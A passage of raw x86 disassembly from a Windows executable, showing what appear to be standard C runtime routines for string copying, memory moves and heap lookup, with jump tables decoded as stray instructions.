  40627c:	89 30                	mov    %esi,(%eax)
  40627e:	53                   	push   %ebx
  40627f:	53                   	push   %ebx
  406280:	53                   	push   %ebx
  406281:	53                   	push   %ebx
  406282:	53                   	push   %ebx
  406283:	e8 8f b6 ff ff       	call   0x401917
  406288:	83 c4 14             	add    $0x14,%esp
  40628b:	8b c6                	mov    %esi,%eax
  40628d:	eb 3c                	jmp    0x4062cb
  40628f:	8b 75 10             	mov    0x10(%ebp),%esi
  406292:	3b f3                	cmp    %ebx,%esi
  406294:	75 04                	jne    0x40629a
  406296:	88 18                	mov    %bl,(%eax)
  406298:	eb da                	jmp    0x406274
  40629a:	8b d0                	mov    %eax,%edx
  40629c:	38 1a                	cmp    %bl,(%edx)
  40629e:	74 04                	je     0x4062a4
  4062a0:	42                   	inc    %edx
  4062a1:	4f                   	dec    %edi
  4062a2:	75 f8                	jne    0x40629c
  4062a4:	3b fb                	cmp    %ebx,%edi
  4062a6:	74 ee                	je     0x406296
  4062a8:	8a 0e                	mov    (%esi),%cl
  4062aa:	88 0a                	mov    %cl,(%edx)
  4062ac:	42                   	inc    %edx
  4062ad:	46                   	inc    %esi
  4062ae:	3a cb                	cmp    %bl,%cl
  4062b0:	74 03                	je     0x4062b5
  4062b2:	4f                   	dec    %edi
  4062b3:	75 f3                	jne    0x4062a8
  4062b5:	3b fb                	cmp    %ebx,%edi
  4062b7:	75 10                	jne    0x4062c9
  4062b9:	88 18                	mov    %bl,(%eax)
  4062bb:	e8 bf b6 ff ff       	call   0x40197f
  4062c0:	6a 22                	push   $0x22
  4062c2:	59                   	pop    %ecx
  4062c3:	89 08                	mov    %ecx,(%eax)
  4062c5:	8b f1                	mov    %ecx,%esi
  4062c7:	eb b5                	jmp    0x40627e
  4062c9:	33 c0                	xor    %eax,%eax
  4062cb:	5f                   	pop    %edi
  4062cc:	5e                   	pop    %esi
  4062cd:	5b                   	pop    %ebx
  4062ce:	5d                   	pop    %ebp
  4062cf:	c3                   	ret
  4062d0:	8b ff                	mov    %edi,%edi
  4062d2:	55                   	push   %ebp
  4062d3:	8b ec                	mov    %esp,%ebp
  4062d5:	53                   	push   %ebx
  4062d6:	56                   	push   %esi
  4062d7:	8b 75 08             	mov    0x8(%ebp),%esi
  4062da:	33 db                	xor    %ebx,%ebx
  4062dc:	57                   	push   %edi
  4062dd:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  4062e0:	75 10                	jne    0x4062f2
  4062e2:	3b f3                	cmp    %ebx,%esi
  4062e4:	75 10                	jne    0x4062f6
  4062e6:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  4062e9:	75 12                	jne    0x4062fd
  4062eb:	33 c0                	xor    %eax,%eax
  4062ed:	5f                   	pop    %edi
  4062ee:	5e                   	pop    %esi
  4062ef:	5b                   	pop    %ebx
  4062f0:	5d                   	pop    %ebp
  4062f1:	c3                   	ret
  4062f2:	3b f3                	cmp    %ebx,%esi
  4062f4:	74 07                	je     0x4062fd
  4062f6:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4062f9:	3b fb                	cmp    %ebx,%edi
  4062fb:	77 1b                	ja     0x406318
  4062fd:	e8 7d b6 ff ff       	call   0x40197f
  406302:	6a 16                	push   $0x16
  406304:	5e                   	pop    %esi
  406305:	89 30                	mov    %esi,(%eax)
  406307:	53                   	push   %ebx
  406308:	53                   	push   %ebx
  406309:	53                   	push   %ebx
  40630a:	53                   	push   %ebx
  40630b:	53                   	push   %ebx
  40630c:	e8 06 b6 ff ff       	call   0x401917
  406311:	83 c4 14             	add    $0x14,%esp
  406314:	8b c6                	mov    %esi,%eax
  406316:	eb d5                	jmp    0x4062ed
  406318:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  40631b:	75 04                	jne    0x406321
  40631d:	88 1e                	mov    %bl,(%esi)
  40631f:	eb ca                	jmp    0x4062eb
  406321:	8b 55 10             	mov    0x10(%ebp),%edx
  406324:	3b d3                	cmp    %ebx,%edx
  406326:	75 04                	jne    0x40632c
  406328:	88 1e                	mov    %bl,(%esi)
  40632a:	eb d1                	jmp    0x4062fd
  40632c:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  406330:	8b c6                	mov    %esi,%eax
  406332:	75 0f                	jne    0x406343
  406334:	8a 0a                	mov    (%edx),%cl
  406336:	88 08                	mov    %cl,(%eax)
  406338:	40                   	inc    %eax
  406339:	42                   	inc    %edx
  40633a:	3a cb                	cmp    %bl,%cl
  40633c:	74 1e                	je     0x40635c
  40633e:	4f                   	dec    %edi
  40633f:	75 f3                	jne    0x406334
  406341:	eb 19                	jmp    0x40635c
  406343:	8a 0a                	mov    (%edx),%cl
  406345:	88 08                	mov    %cl,(%eax)
  406347:	40                   	inc    %eax
  406348:	42                   	inc    %edx
  406349:	3a cb                	cmp    %bl,%cl
  40634b:	74 08                	je     0x406355
  40634d:	4f                   	dec    %edi
  40634e:	74 05                	je     0x406355
  406350:	ff 4d 14             	decl   0x14(%ebp)
  406353:	75 ee                	jne    0x406343
  406355:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  406358:	75 02                	jne    0x40635c
  40635a:	88 18                	mov    %bl,(%eax)
  40635c:	3b fb                	cmp    %ebx,%edi
  40635e:	75 8b                	jne    0x4062eb
  406360:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  406364:	75 0f                	jne    0x406375
  406366:	8b 45 0c             	mov    0xc(%ebp),%eax
  406369:	6a 50                	push   $0x50
  40636b:	88 5c 06 ff          	mov    %bl,-0x1(%esi,%eax,1)
  40636f:	58                   	pop    %eax
  406370:	e9 78 ff ff ff       	jmp    0x4062ed
  406375:	88 1e                	mov    %bl,(%esi)
  406377:	e8 03 b6 ff ff       	call   0x40197f
  40637c:	6a 22                	push   $0x22
  40637e:	59                   	pop    %ecx
  40637f:	89 08                	mov    %ecx,(%eax)
  406381:	8b f1                	mov    %ecx,%esi
  406383:	eb 82                	jmp    0x406307
  406385:	8b ff                	mov    %edi,%edi
  406387:	55                   	push   %ebp
  406388:	8b ec                	mov    %esp,%ebp
  40638a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40638d:	53                   	push   %ebx
  40638e:	33 db                	xor    %ebx,%ebx
  406390:	56                   	push   %esi
  406391:	57                   	push   %edi
  406392:	3b cb                	cmp    %ebx,%ecx
  406394:	74 07                	je     0x40639d
  406396:	8b 7d 0c             	mov    0xc(%ebp),%edi
  406399:	3b fb                	cmp    %ebx,%edi
  40639b:	77 1b                	ja     0x4063b8
  40639d:	e8 dd b5 ff ff       	call   0x40197f
  4063a2:	6a 16                	push   $0x16
  4063a4:	5e                   	pop    %esi
  4063a5:	89 30                	mov    %esi,(%eax)
  4063a7:	53                   	push   %ebx
  4063a8:	53                   	push   %ebx
  4063a9:	53                   	push   %ebx
  4063aa:	53                   	push   %ebx
  4063ab:	53                   	push   %ebx
  4063ac:	e8 66 b5 ff ff       	call   0x401917
  4063b1:	83 c4 14             	add    $0x14,%esp
  4063b4:	8b c6                	mov    %esi,%eax
  4063b6:	eb 30                	jmp    0x4063e8
  4063b8:	8b 75 10             	mov    0x10(%ebp),%esi
  4063bb:	3b f3                	cmp    %ebx,%esi
  4063bd:	75 04                	jne    0x4063c3
  4063bf:	88 19                	mov    %bl,(%ecx)
  4063c1:	eb da                	jmp    0x40639d
  4063c3:	8b d1                	mov    %ecx,%edx
  4063c5:	8a 06                	mov    (%esi),%al
  4063c7:	88 02                	mov    %al,(%edx)
  4063c9:	42                   	inc    %edx
  4063ca:	46                   	inc    %esi
  4063cb:	3a c3                	cmp    %bl,%al
  4063cd:	74 03                	je     0x4063d2
  4063cf:	4f                   	dec    %edi
  4063d0:	75 f3                	jne    0x4063c5
  4063d2:	3b fb                	cmp    %ebx,%edi
  4063d4:	75 10                	jne    0x4063e6
  4063d6:	88 19                	mov    %bl,(%ecx)
  4063d8:	e8 a2 b5 ff ff       	call   0x40197f
  4063dd:	6a 22                	push   $0x22
  4063df:	59                   	pop    %ecx
  4063e0:	89 08                	mov    %ecx,(%eax)
  4063e2:	8b f1                	mov    %ecx,%esi
  4063e4:	eb c1                	jmp    0x4063a7
  4063e6:	33 c0                	xor    %eax,%eax
  4063e8:	5f                   	pop    %edi
  4063e9:	5e                   	pop    %esi
  4063ea:	5b                   	pop    %ebx
  4063eb:	5d                   	pop    %ebp
  4063ec:	c3                   	ret
  4063ed:	8b ff                	mov    %edi,%edi
  4063ef:	55                   	push   %ebp
  4063f0:	8b ec                	mov    %esp,%ebp
  4063f2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4063f5:	56                   	push   %esi
  4063f6:	33 f6                	xor    %esi,%esi
  4063f8:	3b ce                	cmp    %esi,%ecx
  4063fa:	7c 1e                	jl     0x40641a
  4063fc:	83 f9 02             	cmp    $0x2,%ecx
  4063ff:	7e 0c                	jle    0x40640d
  406401:	83 f9 03             	cmp    $0x3,%ecx
  406404:	75 14                	jne    0x40641a
  406406:	a1 08 df 40 00       	mov    0x40df08,%eax
  40640b:	eb 28                	jmp    0x406435
  40640d:	a1 08 df 40 00       	mov    0x40df08,%eax
  406412:	89 0d 08 df 40 00    	mov    %ecx,0x40df08
  406418:	eb 1b                	jmp    0x406435
  40641a:	e8 60 b5 ff ff       	call   0x40197f
  40641f:	56                   	push   %esi
  406420:	56                   	push   %esi
  406421:	56                   	push   %esi
  406422:	56                   	push   %esi
  406423:	56                   	push   %esi
  406424:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40642a:	e8 e8 b4 ff ff       	call   0x401917
  40642f:	83 c4 14             	add    $0x14,%esp
  406432:	83 c8 ff             	or     $0xffffffff,%eax
  406435:	5e                   	pop    %esi
  406436:	5d                   	pop    %ebp
  406437:	c3                   	ret
  406438:	8b ff                	mov    %edi,%edi
  40643a:	55                   	push   %ebp
  40643b:	8b ec                	mov    %esp,%ebp
  40643d:	83 ec 10             	sub    $0x10,%esp
  406440:	ff 75 08             	push   0x8(%ebp)
  406443:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  406446:	e8 0e b3 ff ff       	call   0x401759
  40644b:	0f b6 45 0c          	movzbl 0xc(%ebp),%eax
  40644f:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406452:	8a 55 14             	mov    0x14(%ebp),%dl
  406455:	84 54 01 1d          	test   %dl,0x1d(%ecx,%eax,1)
  406459:	75 1e                	jne    0x406479
  40645b:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40645f:	74 12                	je     0x406473
  406461:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406464:	8b 89 c8 00 00 00    	mov    0xc8(%ecx),%ecx
  40646a:	0f b7 04 41          	movzwl (%ecx,%eax,2),%eax
  40646e:	23 45 10             	and    0x10(%ebp),%eax
  406471:	eb 02                	jmp    0x406475
  406473:	33 c0                	xor    %eax,%eax
  406475:	85 c0                	test   %eax,%eax
  406477:	74 03                	je     0x40647c
  406479:	33 c0                	xor    %eax,%eax
  40647b:	40                   	inc    %eax
  40647c:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  406480:	74 07                	je     0x406489
  406482:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406485:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  406489:	c9                   	leave
  40648a:	c3                   	ret
  40648b:	8b ff                	mov    %edi,%edi
  40648d:	55                   	push   %ebp
  40648e:	8b ec                	mov    %esp,%ebp
  406490:	6a 04                	push   $0x4
  406492:	6a 00                	push   $0x0
  406494:	ff 75 08             	push   0x8(%ebp)
  406497:	6a 00                	push   $0x0
  406499:	e8 9a ff ff ff       	call   0x406438
  40649e:	83 c4 10             	add    $0x10,%esp
  4064a1:	5d                   	pop    %ebp
  4064a2:	c3                   	ret
  4064a3:	cc                   	int3
  4064a4:	cc                   	int3
  4064a5:	cc                   	int3
  4064a6:	cc                   	int3
  4064a7:	cc                   	int3
  4064a8:	cc                   	int3
  4064a9:	cc                   	int3
  4064aa:	cc                   	int3
  4064ab:	cc                   	int3
  4064ac:	cc                   	int3
  4064ad:	cc                   	int3
  4064ae:	cc                   	int3
  4064af:	cc                   	int3
  4064b0:	55                   	push   %ebp
  4064b1:	8b ec                	mov    %esp,%ebp
  4064b3:	57                   	push   %edi
  4064b4:	56                   	push   %esi
  4064b5:	8b 75 0c             	mov    0xc(%ebp),%esi
  4064b8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4064bb:	8b 7d 08             	mov    0x8(%ebp),%edi
  4064be:	8b c1                	mov    %ecx,%eax
  4064c0:	8b d1                	mov    %ecx,%edx
  4064c2:	03 c6                	add    %esi,%eax
  4064c4:	3b fe                	cmp    %esi,%edi
  4064c6:	76 08                	jbe    0x4064d0
  4064c8:	3b f8                	cmp    %eax,%edi
  4064ca:	0f 82 a4 01 00 00    	jb     0x406674
  4064d0:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  4064d6:	72 1f                	jb     0x4064f7
  4064d8:	83 3d 60 e9 40 00 00 	cmpl   $0x0,0x40e960
  4064df:	74 16                	je     0x4064f7
  4064e1:	57                   	push   %edi
  4064e2:	56                   	push   %esi
  4064e3:	83 e7 0f             	and    $0xf,%edi
  4064e6:	83 e6 0f             	and    $0xf,%esi
  4064e9:	3b fe                	cmp    %esi,%edi
  4064eb:	5e                   	pop    %esi
  4064ec:	5f                   	pop    %edi
  4064ed:	75 08                	jne    0x4064f7
  4064ef:	5e                   	pop    %esi
  4064f0:	5f                   	pop    %edi
  4064f1:	5d                   	pop    %ebp
  4064f2:	e9 8a 2a 00 00       	jmp    0x408f81
  4064f7:	f7 c7 03 00 00 00    	test   $0x3,%edi
  4064fd:	75 15                	jne    0x406514
  4064ff:	c1 e9 02             	shr    $0x2,%ecx
  406502:	83 e2 03             	and    $0x3,%edx
  406505:	83 f9 08             	cmp    $0x8,%ecx
  406508:	72 2a                	jb     0x406534
  40650a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40650c:	ff 24 95 24 66 40 00 	jmp    *0x406624(,%edx,4)
  406513:	90                   	nop
  406514:	8b c7                	mov    %edi,%eax
  406516:	ba 03 00 00 00       	mov    $0x3,%edx
  40651b:	83 e9 04             	sub    $0x4,%ecx
  40651e:	72 0c                	jb     0x40652c
  406520:	83 e0 03             	and    $0x3,%eax
  406523:	03 c8                	add    %eax,%ecx
  406525:	ff 24 85 38 65 40 00 	jmp    *0x406538(,%eax,4)
  40652c:	ff 24 8d 34 66 40 00 	jmp    *0x406634(,%ecx,4)
  406533:	90                   	nop
  406534:	ff 24 8d b8 65 40 00 	jmp    *0x4065b8(,%ecx,4)
  40653b:	90                   	nop
  40653c:	48                   	dec    %eax
  40653d:	65 40                	gs inc %eax
  40653f:	00 74 65 40          	add    %dh,0x40(%ebp,%eiz,2)
  406543:	00 98 65 40 00 23    	add    %bl,0x23004065(%eax)
  406549:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  40654f:	46                   	inc    %esi
  406550:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  406556:	02 c1                	add    %cl,%al
  406558:	e9 02 88 47 02       	jmp    0x287ed5f
  40655d:	83 c6 03             	add    $0x3,%esi
  406560:	83 c7 03             	add    $0x3,%edi
  406563:	83 f9 08             	cmp    $0x8,%ecx
  406566:	72 cc                	jb     0x406534
  406568:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40656a:	ff 24 95 24 66 40 00 	jmp    *0x406624(,%edx,4)
  406571:	8d 49 00             	lea    0x0(%ecx),%ecx
  406574:	23 d1                	and    %ecx,%edx
  406576:	8a 06                	mov    (%esi),%al
  406578:	88 07                	mov    %al,(%edi)
  40657a:	8a 46 01             	mov    0x1(%esi),%al
  40657d:	c1 e9 02             	shr    $0x2,%ecx
  406580:	88 47 01             	mov    %al,0x1(%edi)
  406583:	83 c6 02             	add    $0x2,%esi
  406586:	83 c7 02             	add    $0x2,%edi
  406589:	83 f9 08             	cmp    $0x8,%ecx
  40658c:	72 a6                	jb     0x406534
  40658e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406590:	ff 24 95 24 66 40 00 	jmp    *0x406624(,%edx,4)
  406597:	90                   	nop
  406598:	23 d1                	and    %ecx,%edx
  40659a:	8a 06                	mov    (%esi),%al
  40659c:	88 07                	mov    %al,(%edi)
  40659e:	83 c6 01             	add    $0x1,%esi
  4065a1:	c1 e9 02             	shr    $0x2,%ecx
  4065a4:	83 c7 01             	add    $0x1,%edi
  4065a7:	83 f9 08             	cmp    $0x8,%ecx
  4065aa:	72 88                	jb     0x406534
  4065ac:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4065ae:	ff 24 95 24 66 40 00 	jmp    *0x406624(,%edx,4)
  4065b5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4065b8:	1b 66 40             	sbb    0x40(%esi),%esp
  4065bb:	00 08                	add    %cl,(%eax)
  4065bd:	66 40                	inc    %ax
  4065bf:	00 00                	add    %al,(%eax)
  4065c1:	66 40                	inc    %ax
  4065c3:	00 f8                	add    %bh,%al
  4065c5:	65 40                	gs inc %eax
  4065c7:	00 f0                	add    %dh,%al
  4065c9:	65 40                	gs inc %eax
  4065cb:	00 e8                	add    %ch,%al
  4065cd:	65 40                	gs inc %eax
  4065cf:	00 e0                	add    %ah,%al
  4065d1:	65 40                	gs inc %eax
  4065d3:	00 d8                	add    %bl,%al
  4065d5:	65 40                	gs inc %eax
  4065d7:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  4065dd:	44                   	inc    %esp
  4065de:	8f                   	(bad)
  4065df:	e4 8b                	in     $0x8b,%al
  4065e1:	44                   	inc    %esp
  4065e2:	8e e8                	mov    %eax,%gs
  4065e4:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  4065e8:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  4065ec:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  4065f0:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  4065f4:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  4065f8:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  4065fc:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  406600:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  406604:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  406608:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  40660c:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  406610:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  406617:	03 f0                	add    %eax,%esi
  406619:	03 f8                	add    %eax,%edi
  40661b:	ff 24 95 24 66 40 00 	jmp    *0x406624(,%edx,4)
  406622:	8b ff                	mov    %edi,%edi
  406624:	34 66                	xor    $0x66,%al
  406626:	40                   	inc    %eax
  406627:	00 3c 66             	add    %bh,(%esi,%eiz,2)
  40662a:	40                   	inc    %eax
  40662b:	00 48 66             	add    %cl,0x66(%eax)
  40662e:	40                   	inc    %eax
  40662f:	00 5c 66 40          	add    %bl,0x40(%esi,%eiz,2)
  406633:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  406639:	c9                   	leave
  40663a:	c3                   	ret
  40663b:	90                   	nop
  40663c:	8a 06                	mov    (%esi),%al
  40663e:	88 07                	mov    %al,(%edi)
  406640:	8b 45 08             	mov    0x8(%ebp),%eax
  406643:	5e                   	pop    %esi
  406644:	5f                   	pop    %edi
  406645:	c9                   	leave
  406646:	c3                   	ret
  406647:	90                   	nop
  406648:	8a 06                	mov    (%esi),%al
  40664a:	88 07                	mov    %al,(%edi)
  40664c:	8a 46 01             	mov    0x1(%esi),%al
  40664f:	88 47 01             	mov    %al,0x1(%edi)
  406652:	8b 45 08             	mov    0x8(%ebp),%eax
  406655:	5e                   	pop    %esi
  406656:	5f                   	pop    %edi
  406657:	c9                   	leave
  406658:	c3                   	ret
  406659:	8d 49 00             	lea    0x0(%ecx),%ecx
  40665c:	8a 06                	mov    (%esi),%al
  40665e:	88 07                	mov    %al,(%edi)
  406660:	8a 46 01             	mov    0x1(%esi),%al
  406663:	88 47 01             	mov    %al,0x1(%edi)
  406666:	8a 46 02             	mov    0x2(%esi),%al
  406669:	88 47 02             	mov    %al,0x2(%edi)
  40666c:	8b 45 08             	mov    0x8(%ebp),%eax
  40666f:	5e                   	pop    %esi
  406670:	5f                   	pop    %edi
  406671:	c9                   	leave
  406672:	c3                   	ret
  406673:	90                   	nop
  406674:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  406678:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  40667c:	f7 c7 03 00 00 00    	test   $0x3,%edi
  406682:	75 24                	jne    0x4066a8
  406684:	c1 e9 02             	shr    $0x2,%ecx
  406687:	83 e2 03             	and    $0x3,%edx
  40668a:	83 f9 08             	cmp    $0x8,%ecx
  40668d:	72 0d                	jb     0x40669c
  40668f:	fd                   	std
  406690:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406692:	fc                   	cld
  406693:	ff 24 95 c0 67 40 00 	jmp    *0x4067c0(,%edx,4)
  40669a:	8b ff                	mov    %edi,%edi
  40669c:	f7 d9                	neg    %ecx
  40669e:	ff 24 8d 70 67 40 00 	jmp    *0x406770(,%ecx,4)
  4066a5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4066a8:	8b c7                	mov    %edi,%eax
  4066aa:	ba 03 00 00 00       	mov    $0x3,%edx
  4066af:	83 f9 04             	cmp    $0x4,%ecx
  4066b2:	72 0c                	jb     0x4066c0
  4066b4:	83 e0 03             	and    $0x3,%eax
  4066b7:	2b c8                	sub    %eax,%ecx
  4066b9:	ff 24 85 c4 66 40 00 	jmp    *0x4066c4(,%eax,4)
  4066c0:	ff 24 8d c0 67 40 00 	jmp    *0x4067c0(,%ecx,4)
  4066c7:	90                   	nop
  4066c8:	d4 66                	aam    $0x66
  4066ca:	40                   	inc    %eax
  4066cb:	00 f8                	add    %bh,%al
  4066cd:	66 40                	inc    %ax
  4066cf:	00 20                	add    %ah,(%eax)
  4066d1:	67 40                	addr16 inc %eax
  4066d3:	00 8a 46 03 23 d1    	add    %cl,-0x2edcfcba(%edx)
  4066d9:	88 47 03             	mov    %al,0x3(%edi)
  4066dc:	83 ee 01             	sub    $0x1,%esi
  4066df:	c1 e9 02             	shr    $0x2,%ecx
  4066e2:	83 ef 01             	sub    $0x1,%edi
  4066e5:	83 f9 08             	cmp    $0x8,%ecx
  4066e8:	72 b2                	jb     0x40669c
  4066ea:	fd                   	std
  4066eb:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4066ed:	fc                   	cld
  4066ee:	ff 24 95 c0 67 40 00 	jmp    *0x4067c0(,%edx,4)
  4066f5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4066f8:	8a 46 03             	mov    0x3(%esi),%al
  4066fb:	23 d1                	and    %ecx,%edx
  4066fd:	88 47 03             	mov    %al,0x3(%edi)
  406700:	8a 46 02             	mov    0x2(%esi),%al
  406703:	c1 e9 02             	shr    $0x2,%ecx
  406706:	88 47 02             	mov    %al,0x2(%edi)
  406709:	83 ee 02             	sub    $0x2,%esi
  40670c:	83 ef 02             	sub    $0x2,%edi
  40670f:	83 f9 08             	cmp    $0x8,%ecx
  406712:	72 88                	jb     0x40669c
  406714:	fd                   	std
  406715:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406717:	fc                   	cld
  406718:	ff 24 95 c0 67 40 00 	jmp    *0x4067c0(,%edx,4)
  40671f:	90                   	nop
  406720:	8a 46 03             	mov    0x3(%esi),%al
  406723:	23 d1                	and    %ecx,%edx
  406725:	88 47 03             	mov    %al,0x3(%edi)
  406728:	8a 46 02             	mov    0x2(%esi),%al
  40672b:	88 47 02             	mov    %al,0x2(%edi)
  40672e:	8a 46 01             	mov    0x1(%esi),%al
  406731:	c1 e9 02             	shr    $0x2,%ecx
  406734:	88 47 01             	mov    %al,0x1(%edi)
  406737:	83 ee 03             	sub    $0x3,%esi
  40673a:	83 ef 03             	sub    $0x3,%edi
  40673d:	83 f9 08             	cmp    $0x8,%ecx
  406740:	0f 82 56 ff ff ff    	jb     0x40669c
  406746:	fd                   	std
  406747:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406749:	fc                   	cld
  40674a:	ff 24 95 c0 67 40 00 	jmp    *0x4067c0(,%edx,4)
  406751:	8d 49 00             	lea    0x0(%ecx),%ecx
  406754:	74 67                	je     0x4067bd
  406756:	40                   	inc    %eax
  406757:	00 7c 67 40          	add    %bh,0x40(%edi,%eiz,2)
  40675b:	00 84 67 40 00 8c 67 	add    %al,0x678c0040(%edi,%eiz,2)
  406762:	40                   	inc    %eax
  406763:	00 94 67 40 00 9c 67 	add    %dl,0x679c0040(%edi,%eiz,2)
  40676a:	40                   	inc    %eax
  40676b:	00 a4 67 40 00 b7 67 	add    %ah,0x67b70040(%edi,%eiz,2)
  406772:	40                   	inc    %eax
  406773:	00 8b 44 8e 1c 89    	add    %cl,-0x76e371bc(%ebx)
  406779:	44                   	inc    %esp
  40677a:	8f                   	(bad)
  40677b:	1c 8b                	sbb    $0x8b,%al
  40677d:	44                   	inc    %esp
  40677e:	8e 18                	mov    (%eax),%ds
  406780:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  406784:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  406788:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  40678c:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  406790:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  406794:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  406798:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  40679c:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  4067a0:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  4067a4:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  4067a8:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  4067ac:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  4067b3:	03 f0                	add    %eax,%esi
  4067b5:	03 f8                	add    %eax,%edi
  4067b7:	ff 24 95 c0 67 40 00 	jmp    *0x4067c0(,%edx,4)
  4067be:	8b ff                	mov    %edi,%edi
  4067c0:	d0 67 40             	shlb   $1,0x40(%edi)
  4067c3:	00 d8                	add    %bl,%al
  4067c5:	67 40                	addr16 inc %eax
  4067c7:	00 e8                	add    %ch,%al
  4067c9:	67 40                	addr16 inc %eax
  4067cb:	00 fc                	add    %bh,%ah
  4067cd:	67 40                	addr16 inc %eax
  4067cf:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  4067d5:	c9                   	leave
  4067d6:	c3                   	ret
  4067d7:	90                   	nop
  4067d8:	8a 46 03             	mov    0x3(%esi),%al
  4067db:	88 47 03             	mov    %al,0x3(%edi)
  4067de:	8b 45 08             	mov    0x8(%ebp),%eax
  4067e1:	5e                   	pop    %esi
  4067e2:	5f                   	pop    %edi
  4067e3:	c9                   	leave
  4067e4:	c3                   	ret
  4067e5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4067e8:	8a 46 03             	mov    0x3(%esi),%al
  4067eb:	88 47 03             	mov    %al,0x3(%edi)
  4067ee:	8a 46 02             	mov    0x2(%esi),%al
  4067f1:	88 47 02             	mov    %al,0x2(%edi)
  4067f4:	8b 45 08             	mov    0x8(%ebp),%eax
  4067f7:	5e                   	pop    %esi
  4067f8:	5f                   	pop    %edi
  4067f9:	c9                   	leave
  4067fa:	c3                   	ret
  4067fb:	90                   	nop
  4067fc:	8a 46 03             	mov    0x3(%esi),%al
  4067ff:	88 47 03             	mov    %al,0x3(%edi)
  406802:	8a 46 02             	mov    0x2(%esi),%al
  406805:	88 47 02             	mov    %al,0x2(%edi)
  406808:	8a 46 01             	mov    0x1(%esi),%al
  40680b:	88 47 01             	mov    %al,0x1(%edi)
  40680e:	8b 45 08             	mov    0x8(%ebp),%eax
  406811:	5e                   	pop    %esi
  406812:	5f                   	pop    %edi
  406813:	c9                   	leave
  406814:	c3                   	ret
  406815:	8b ff                	mov    %edi,%edi
  406817:	55                   	push   %ebp
  406818:	8b ec                	mov    %esp,%ebp
  40681a:	8b 0d 64 e9 40 00    	mov    0x40e964,%ecx
  406820:	a1 68 e9 40 00       	mov    0x40e968,%eax
  406825:	6b c9 14             	imul   $0x14,%ecx,%ecx
  406828:	03 c8                	add    %eax,%ecx
  40682a:	eb 11                	jmp    0x40683d
  40682c:	8b 55 08             	mov    0x8(%ebp),%edx
  40682f:	2b 50 0c             	sub    0xc(%eax),%edx
  406832:	81 fa 00 00 10 00    	cmp    $0x100000,%edx
  406838:	72 09                	jb     0x406843
  40683a:	83 c0 14             	add    $0x14,%eax
  40683d:	3b c1                	cmp    %ecx,%eax
  40683f:	72 eb                	jb     0x40682c
  406841:	33 c0                	xor    %eax,%eax
  406843:	5d                   	pop    %ebp
  406844:	c3                   	ret
  406845:	8b ff                	mov    %edi,%edi
  406847:	55                   	push   %ebp
  406848:	8b ec                	mov    %esp,%ebp
  40684a:	83 ec 10             	sub    $0x10,%esp
  40684d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406850:	8b 41 10             	mov    0x10(%ecx),%eax
  406853:	56                   	push   %esi
  406854:	8b 75 0c             	mov    0xc(%ebp),%esi
  406857:	57                   	push   %edi
  406858:	8b fe                	mov    %esi,%edi
